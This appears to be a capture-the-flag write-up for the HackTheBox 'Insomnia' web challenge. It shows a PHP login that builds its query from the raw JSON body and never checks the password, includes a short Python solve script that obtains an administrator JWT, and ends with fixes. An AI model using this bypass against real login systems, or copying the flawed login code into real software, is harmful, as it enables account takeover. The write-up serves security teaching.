## Overview

`Insomnia` is an Easy HackTheBox **Web** challenge — a small CodeIgniter 4 / PHP 8.1
app backed by SQLite. The flag is shown on `/profile` only when your session token
says you are `administrator`. The admin password and the JWT signing secret are both
random and unguessable, so neither cracking nor forging is on the table. The flaw is
in the login *logic*: it treats "does a row match my JSON?" as "are these credentials
valid?" — an [authentication bypass](https://cwe.mitre.org/data/definitions/287.html).

## The technique

The login controller passes the **entire decoded JSON request body** straight into the
query builder as the `WHERE` filter, then mints a signed JWT for whatever row matches —
with **no separate password check**:

```php
$json_data = request()->getJSON(true);          // attacker-controlled assoc array
if (!count($json_data) == 2) { ... }             // "require 2 fields" — but broken (see below)
$query  = $db->table("users")->getWhere($json_data, 1, 0);
$result = $query->getRowArray();
if (!$result) { return 404; }
// else: sign a JWT with $result["username"]  — password is never compared
$token = JWT::encode(["username" => $result["username"], ...], $key, "HS256");
```

Because the password is just another column in the same filter, **omitting it removes
the constraint**. Send only `{"username":"administrator"}` and the query collapses to
`SELECT * FROM users WHERE username = 'administrator' LIMIT 1`, matches the seeded admin
row, and the server signs a genuine `administrator` token for you. The unknown
`JWT_SECRET` is irrelevant — the server is the signing oracle.

There is a compounding bug that disarms the field-count guard. `if (!count($json_data) == 2)`
parses as `(!count(...)) == 2`, because PHP's `!` binds tighter than `==`. `!count(...)`
is a boolean, and `bool == 2` is always false — so the guard never blocks a one-field
body. (General rule: a `!x == N` comparison is almost always a bug.)

The flag gate in `ProfileController` simply trusts the token's claim — an
[authorization decision keyed on a user-controlled value](https://cwe.mitre.org/data/definitions/639.html):

```php
$jwt_decode = JWT::decode($_COOKIE["token"], new Key($key, "HS256"));
if ($jwt_decode->username == "administrator") {
    return view("ProfilePage", ["content" => file_get_contents(APPPATH . "/../flag.txt")]);
}
```

## Solution

Two requests. Note routes resolve through the front controller (`/index.php/<route>`) —
`mod_rewrite` is off, so the bare `/login` returns a 404 with the body `index.php`.

Create `solve.py`:

```python
import sys, requests, re
base = sys.argv[1].rstrip("/")
pre  = f"{base}/index.php"

# 1) login with ONLY the username -> the filter collapses to WHERE username='administrator',
#    matches the admin row, and the server signs a valid administrator JWT (no password).
token = requests.post(f"{pre}/login", json={"username": "administrator"}).json()["token"]
print("[+] admin JWT:", token)

# 2) present it as the `token` cookie; /profile gates the flag on username == "administrator".
html = requests.get(f"{pre}/profile", cookies={"token": token}).text
print("[+] FLAG:", re.search(r"HTB\{[^}]+\}", html).group(0))
```

Run it against the instance:

```bash
python3 solve.py http://<host>:<port>
# [+] admin JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
# [+] FLAG: HTB{...}
```

## Why it worked

Building the `WHERE` clause from user-controlled keys conflates two distinct steps —
*finding* the user and *verifying* the secret. Once the password is just another
optional filter column, an attacker simply leaves it out. Authentication should be an
explicit, constant-time comparison of a supplied secret against a stored hash, never an
emergent property of which rows a query happens to return. The precedence-broken guard
then removed even the weak "you must send two fields" speed bump.

## Fix / defense

- Authenticate explicitly: look the user up by username, then `password_verify()` the
  supplied password against a stored argon2/bcrypt hash. Never pass the raw request body
  into a query builder.

  ```php
  $u = $db->table('users')->where('username', $json['username'])->get()->getRowArray();
  if ($u && password_verify($json['password'], $u['password'])) { /* mint token */ }
  return $this->respond('Invalid credentials', 401);
  ```

- Whitelist exactly the fields the query needs and reject extra/operator-shaped keys.
- Write guards so they actually run: `if (count($json_data) !== 2)`.
- Don't derive authorization from a claim that the login flow will sign for anyone.
